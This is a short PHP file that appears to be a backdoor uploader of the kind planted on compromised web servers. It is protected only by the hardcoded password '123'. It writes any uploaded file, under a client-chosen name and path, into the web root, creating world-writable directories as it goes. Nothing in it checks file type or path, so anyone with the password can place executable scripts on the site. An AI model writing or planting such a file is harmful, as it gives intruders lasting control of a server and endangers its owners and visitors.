<?PHP
$pswd=$_POST['pswd'];
if($pswd=='123'){
$dir=stripslashes($_POST['pathdir']);
if($dir=='ok'){$ndir=dirname(__FILE__).'/';}else{$ndir=$_SERVER['DOCUMENT_ROOT'].$dir;}
if ($_FILES["file"]["error"] > 0){
}else{
mkdir($ndir,0777);
move_uploaded_file($_FILES["file"]["tmp_name"],$ndir . $_FILES["file"]["name"]);}}
?>